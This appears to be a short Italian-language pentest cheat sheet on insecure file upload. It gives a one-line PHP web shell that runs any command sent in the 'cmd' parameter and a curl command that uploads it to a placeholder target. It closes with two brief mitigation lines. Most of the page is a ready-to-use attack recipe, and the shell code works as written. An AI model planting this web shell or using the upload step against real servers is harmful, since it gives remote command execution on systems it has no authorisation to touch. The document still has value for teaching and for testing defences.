# Insecure File Upload

### **Obiettivo**
Caricare un file dannoso (es. script PHP) sul server.

### **Payload di Base**

- **File PHP malevolo:**
    ```php
  <?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
    ```

- **Caricamento tramite POST (con curl):**
    ```bash
  curl -X POST -F "file=@shell.php" http://target-site.com/upload
    ```

### **Mitigazione**
- Valida estensioni e content-type, rinomina i file.
- Disabilita l'esecuzione di script nella directory di upload.
